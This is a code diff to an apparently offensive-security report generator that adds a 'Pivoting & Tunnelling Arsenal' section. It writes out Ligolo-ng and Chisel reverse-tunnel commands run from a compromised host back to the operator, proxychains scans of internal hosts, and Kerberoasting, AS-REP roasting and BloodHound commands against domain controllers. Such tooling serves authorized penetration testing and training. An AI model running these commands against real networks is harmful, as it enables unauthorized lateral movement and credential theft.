@@ -372,6 +372,215 @@ def _post_shell_kit(os_type: str) -> List[str]:
 
 
 # ===========================================================================
+# Pivoting & Tunnelling Arsenal
+# ===========================================================================
+
+def _pivot_section(info: "TargetInfo", lhost: str) -> List[str]:
+    """
+    Return Markdown lines for the Pivoting & Tunnelling Arsenal section.
+
+    Always injected.  Contents:
+      - Safety warning (transfer binaries first)
+      - Dual-homed NIC check (OS-contextualised)
+      - Ligolo-ng full workflow (attacker + target + routing)
+      - Chisel SOCKS5 reverse proxy workflow
+      - proxychains4.conf reminder snippet
+      - If is_domain_controller: proxychains AD command block pre-filled
+        with the DC IP and domain
+
+    Format: fenced code blocks only — no checkbox lists.
+    All <LHOST> placeholders replaced with the operator's actual IP.
+    """
+    ip     = info.ip
+    os_type = info.os_type
+    domain  = info.domain or "<DOMAIN>"
+
+    lines: List[str] = [
+        "---",
+        "",
+        "### 🕸️ Pivoting & Tunnelling Arsenal",
+        "",
+        "> **[!] ⚠️ STOP: Ensure you have transferred the required binaries to the "
+        "target first using the File Transfer section above.**",
+        "",
+        "**Step 0 — Confirm dual-homed status** *(run immediately after shell)*",
+        "",
+    ]
+
+    # OS-contextualised NIC check
+    if os_type == "Windows":
+        lines += [
+            "```powershell",
+            "ipconfig /all          # look for multiple adapters / subnets",
+            "route print            # check routing table for internal ranges",
+            "```",
+            "",
+        ]
+    else:
+        lines += [
+            "```bash",
+            "ip a                   # look for multiple interfaces",
+            "ip route               # check routing table for internal subnets",
+            "```",
+            "",
+        ]
+
+    # ── Ligolo-ng ─────────────────────────────────────────────────────────
+    lines += [
+        "---",
+        "",
+        "#### Ligolo-ng *(recommended — transparent full-tunnel, no proxychains)*",
+        "",
+        "**1. Attacker — start the proxy** *(run once, keep this terminal open)*:",
+        "",
+        "```bash",
+        f"./ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
+        "```",
+        "",
+        "**2. Target — connect back to attacker:**",
+        "",
+    ]
+
+    if os_type == "Windows":
+        lines += [
+            "```powershell",
+            f".\\ligolo-agent.exe -connect {lhost}:11601 -ignore-cert",
+            "```",
+            "",
+        ]
+    else:
+        lines += [
+            "```bash",
+            f"chmod +x ./ligolo-agent 2>/dev/null; ./ligolo-agent -connect {lhost}:11601 -ignore-cert",
+            "```",
+            "",
+        ]
+
+    lines += [
+        "**3. Attacker — inside the Ligolo console** *(after agent connects)*:",
+        "",
+        "```",
+        "session          # select the new session",
+        "start            # start the tunnel",
+        "```",
+        "",
+        "**4. Attacker — add a route to the internal subnet** *(new terminal)*:",
+        "",
+        "```bash",
+        "# Replace 172.16.x.0/24 with the actual internal subnet from 'ip route' above",
+        "sudo ip route add 172.16.x.0/24 dev ligolo",
+        "",
+        "# Verify",
+        "ip route | grep ligolo",
+        "```",
+        "",
+    ]
+
+    # ── Chisel ────────────────────────────────────────────────────────────
+    lines += [
+        "---",
+        "",
+        "#### Chisel *(fallback — SOCKS5 reverse proxy via proxychains)*",
+        "",
+        "**1. Attacker — start the server:**",
+        "",
+        "```bash",
+        f"./chisel server --reverse -p 1080 --socks5",
+        "```",
+        "",
+        "**2. Target — connect back:**",
+        "",
+    ]
+
+    if os_type == "Windows":
+        lines += [
+            "```powershell",
+            f".\\chisel.exe client {lhost}:1080 R:socks",
+            "```",
+            "",
+        ]
+    else:
+        lines += [
+            "```bash",
+            f"chmod +x ./chisel 2>/dev/null; ./chisel client {lhost}:1080 R:socks",
+            "```",
+            "",
+        ]
+
+    # ── proxychains config reminder ───────────────────────────────────────
+    lines += [
+        "**3. Attacker — configure proxychains** *(add to end of `/etc/proxychains4.conf`)*:",
+        "",
+        "```",
+        "# Comment out any existing socks lines, then add:",
+        "socks5  127.0.0.1  1080",
+        "```",
+        "",
+        "**4. Use proxychains to reach the internal network:**",
+        "",
+        "```bash",
+        "proxychains nmap -sT -Pn -p 22,80,443,445,3389 <INTERNAL_IP>",
+        "proxychains nxc smb <INTERNAL_IP>",
+        "proxychains curl http://<INTERNAL_IP>/",
+        "```",
+        "",
+    ]
+
+    # ── AD Pivot Integration ──────────────────────────────────────────────
+    if info.is_domain_controller:
+        users_file = f"output/targets/{ip}/users.txt"
+        dc_base = (
+            "DC=" + ",DC=".join(domain.split("."))
+            if "." in domain else f"DC={domain}"
+        )
+        lines += [
+            "---",
+            "",
+            f"#### 🏰 AD Pivot — Commands for the Internal Domain (`{domain}`)",
+            "",
+            f"> DC IP: `{ip}` — run these **through proxychains** (Chisel) or **directly** (Ligolo tunnel).",
+            "",
+            "**SMB reachability check:**",
+            "",
+            "```bash",
+            f"proxychains nxc smb {ip}",
+            f"proxychains nxc smb {ip} -u '' -p '' --shares",
+            "```",
+            "",
+            "**AS-REP Roasting through the tunnel:**",
+            "",
+            "```bash",
+            f"proxychains impacket-GetNPUsers {domain}/ -usersfile {users_file} "
+            f"-format hashcat -dc-ip {ip} -no-pass",
+            "```",
+            "",
+            "**Kerberoasting through the tunnel:**",
+            "",
+            "```bash",
+            f"proxychains impacket-GetUserSPNs {domain}/'<USER>:<PASS>' -dc-ip {ip} -request",
+            "```",
+            "",
+            "**BloodHound collection through the tunnel:**",
+            "",
+            "```bash",
+            f"proxychains bloodhound-python -u '<USER>' -p '<PASS>' "
+            f"-d {domain} -dc {ip} -c All --dns-tcp",
+            "```",
+            "",
+            "**LDAP enumeration through the tunnel:**",
+            "",
+            "```bash",
+            f"proxychains ldapsearch -x -H ldap://{ip} -b '{dc_base}' "
+            f"'(objectClass=user)' sAMAccountName",
+            "```",
+            "",
+        ]
+
+    lines += ["---", ""]
+    return lines
+
+
+# ===========================================================================
 # Main generator
 # ===========================================================================
 
@@ -667,44 +876,7 @@ def generate_advisor_markdown(info: "TargetInfo", lhost: str = "<LHOST>") -> str
                 "",
             ]
 
-    # ── Pivot Rule 2: Always include tunnelling tools ─────────────────────
-    pivot_tools = PIVOT_TOOLS_WINDOWS if os_type == "Windows" else PIVOT_TOOLS_LINUX
-    lines += [
-        "### 🕸️ Pivoting & Tunnelling Arsenal",
-        "",
-        "> **Verify dual-homed status immediately after gaining a shell:**",
-        "",
-    ]
-    if os_type == "Windows":
-        lines += [
-            "- [ ] 💡 `ipconfig /all` — look for multiple network adapters",
-            "- [ ] 💡 `route print` — check routing table for internal subnets",
-            "",
-        ]
-    else:
-        lines += [
-            "- [ ] 💡 `ip a` — look for multiple network interfaces",
-            "- [ ] 💡 `ip route` — check routing table for internal subnets",
-            "",
-        ]
-
-    for tool in pivot_tools:
-        lines += _tool_block(tool, info, lhost)
-
-    # Attacker-side server commands for each pivot tool
-    lines += [
-        "> **Attacker-side — start your proxy/tunnel listener:**",
-        ">",
-        "> ```bash",
-        "> # Chisel server (SOCKS5 reverse proxy)",
-        "> ./chisel server --reverse -p 1080",
-        ">",
-        "> # Ligolo-ng proxy",
-        "> ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
-        "> ```",
-        "",
-        "---",
-        "",
-    ]
+    # ── Pivot Rule 2: Operational pivoting section ───────────────────────
+    lines += _pivot_section(info, lhost)
 
     return "\n".join(lines)
